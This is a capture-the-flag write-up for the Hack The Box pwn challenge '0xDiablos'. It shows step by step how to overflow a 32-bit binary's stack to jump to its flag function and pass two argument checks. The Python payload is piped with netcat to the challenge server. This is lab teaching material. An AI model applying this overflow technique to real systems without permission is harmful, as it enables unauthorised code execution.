## 0xDiablos
0xDiablos is a pwn challenge that focuses mainly on buffer overflow.

## Exploit
First, let's check what type of binary is this using ```file``` command. 

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ file vuln   
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```

Next, let's create a payload to send to the program using msf

```
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Using gdb, we can find that the EIP of the stack when we overflow the stack is 2Ag3. 

![EIP](https://github.com/joelczk/writeups/blob/main/HTB%20Challenges/Images/You%20know%200xDiablos/eip.png)

With the EIP, we will find the offset of the pattern.

```
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 2Ag3
[*] Exact match at offset 188
```

Decompiling the binary in IDA, we are able to know that the HTB flag can be obtained from the *flag* function.

![Flag function](https://github.com/joelczk/writeups/blob/main/HTB%20Challenges/Images/You%20know%200xDiablos/flag.png)

Next, we will find the address of the *flag* function using gdb
```
gdb-peda$ p flag
$1 = {<text variable, no debug info>} 0x80491e2 <flag>
```

Afterwards, we will modify our payload obtain our flag. However, we realize that we are still not obtaining our flag.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | nc 138.68.131.63 32118             5 ⚙
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
```

However, we realize that we are still unable to obtain the flag as there is a check for 0xDEADBEEF and 0xC0DED00D
![Check](https://github.com/joelczk/writeups/blob/main/HTB%20Challenges/Images/You%20know%200xDiablos/check.png)

Next we will craft the new payload as ```'A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0'```. The reason why we have to add ```'A' * 4``` is because we are currently at the address of the return address and we would have to jump accross the EBP pointer to reach the local variables.

![Stack diagram](https://github.com/joelczk/writeups/blob/main/HTB%20Challenges/Images/You%20know%200xDiablos/stack_diagram.png)

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | nc 138.68.131.63 32118
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAﾭ�
<HTB Flag>
```
